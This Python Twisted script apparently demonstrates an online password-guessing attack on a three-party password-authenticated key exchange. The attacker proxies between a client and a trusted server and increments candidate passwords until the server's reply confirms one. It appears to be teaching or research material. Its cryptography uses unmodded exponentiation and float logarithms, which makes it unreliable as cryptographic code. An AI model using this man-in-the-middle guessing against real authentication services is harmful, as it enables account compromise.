from twisted.internet import protocol, reactor
from random import seed, randint
from struct import pack, unpack
from threading import Event
from math import log
import public

pwB = 3

A = None
g_pwA = 0
X = None

g_power_xz = None
y = None
g_x = None


def receiveConnectRequest(message):
    global y

    seed()
    y = randint(1, public.q - 1)
    print('B paramteters [*]: y = ', y)

    random_X = randint(1, 100000)
    random_alpha = randint(1, 100000)
    print('B paramteters [*]: random X\' = ', random_X)
    print('B paramteters [*]: random alpha\' = ', random_alpha, '\n')

    A, X = unpack('hxq', message)

    return pack('qxq', random_X, random_alpha), A, X

def passwordGuesseResult(response):
    global y, guessed, responseReceived, g_x

    S_X, S_Y = unpack('qxq', response)
    print('S paramteters (received) [*]: S_X = ', S_X)
    print('S paramteters (received) [*]: S_Y = ', S_Y)

    g_power_xz = int(S_X / public.G((public.B_identifier, public.S_identifier, public.g ** (g_x * y))) ** pwB)
    print('B calculates [*]: g^(xz) = ', g_power_xz)

    g_power_xzy = int(S_Y / public.G((A, public.S_identifier, public.g ** g_x)) ** g_pwA)
    print('B calculates [*]: g^(x\'zy) = ', g_power_xzy, '\n')

    if (g_power_xz ** y == g_power_xzy):
        guessed = True
        return True

    responseReceived = True

    return False


class TCPProxyProtocol(protocol.Protocol):
    """
    TCPProxyProtocol listens for TCP connections from a
    client (eg. a phone) and forwards them on to a
    specified destination (eg. an app's API server) over
    a second TCP connection, using a ProxyToServerProtocol.

    It assumes that neither leg of this trip is encrypted.
    """

    def __init__(self):
        self.buffer = None
        self.connectedToProxy = Event()
        self.proxyToServerProtocol = None

        self.initialReceive = False
        self.betaReceive = False

    def connectionMade(self):
        """
        Called by twisted when a client connects to the
        proxy. Makes an connection from the proxy to the
        server to complete the chain.
        """
        #print("Connection made from CLIENT => PROXY")
        proxyToServerFactory = protocol.ClientFactory()
        proxyToServerFactory.protocol = ProxyToServerProtocol
        proxyToServerFactory.server = self

        reactor.connectTCP(public.TRUSTED_SERVER_IP, public.TRUSTED_SERVER_PORT,
                           proxyToServerFactory)

    def dataReceived(self, data):
        """
        Called by twisted when the proxy receives data from
        the client. Sends the data on to the server.

        CLIENT ===> PROXY ===> DST
        """
        global A, X

        messForA, A, X = receiveConnectRequest(data)

        self.writeToClient(messForA)

        self.connectedToProxy.wait(5)

        if not self.connectedToProxy.is_set():
            reactor.stop()
            return

        self.proxyToServerProtocol.tryPassword(g_pwA)

    def writeToClient(self, data):
        self.transport.write(data)


class ProxyToServerProtocol(protocol.Protocol):
    """
    ProxyToServerProtocol connects to a server over TCP.
    It sends the server data given to it by an
    TCPProxyProtocol, and uses the TCPProxyProtocol to
    send data that it receives back from the server on
    to a client.
    """

    def connectionMade(self):
        """
        Called by twisted when the proxy connects to the
        server. Flushes any buffered data on the proxy to
        server.
        """
        #print("Connection made from PROXY => SERVER")
        self.factory.server.proxyToServerProtocol = self
        self.factory.server.connectedToProxy.set()
        self.write(self.factory.server.buffer)
        self.factory.server.buffer = ''

        self.serverResponseReceive = False

    def connectionLost(self, reason):
        self.factory.server.connectedToProxy.clear()

    def tryPassword(self, pwA):
        global y, g_x

        print('\n----------------------------------------\n')

        print('Attacker try password [*] pwA\' = ', pwA)

        g_power_g_x = int(X / public.M ** pwA)
        g_x = int(log(g_power_g_x, public.g))

        print('Attacker try x\' [*] pwA\' = ', g_x)

        Y = (g_power_g_x ** y) * public.N ** pwB
        print('B calculates [*]: Y* = ', Y, '\n')

        message = pack('hxq', A, X) + pack('hxq', public.B_identifier, Y)

        self.write(message)

    def dataReceived(self, data):
        """
        Called by twisted when the proxy receives data
        from the server. Sends the data on to to the client.

        DST ===> PROXY ===> CLIENT
        """
        global g_pwA

        if not passwordGuesseResult(data):
            g_pwA += 1
            self.tryPassword(g_pwA)
        else:
            print('\n----------------------------------------\n')
            print('Attacker guessed password [$COMPLITE$] pwA = ', g_pwA, '\n')
            g_pwA = 0
            reactor.stop()

    def write(self, data):
        if data:
            self.transport.write(data)

factory = protocol.ServerFactory()
factory.protocol = TCPProxyProtocol
print('Starting attacker B [*]: id = ', public.B_identifier)
print('Starting attacker B [*]: ip = ', public.B_CLIENT_IP)
print('Starting attacker B [*]: port = ', public.B_CLIENT_PORT)
print('Starting attacker B [*]: listening')
print('Connection public parameters [*]: q = ', public.q)
print('Connection public parameters [*]: g = ', public.g)
print('Connection public parameters [*]: M = ', public.M)
print('Connection public parameters [*]: N = ', public.N, '\n')
reactor.listenTCP(public.B_CLIENT_PORT, factory)
reactor.run()
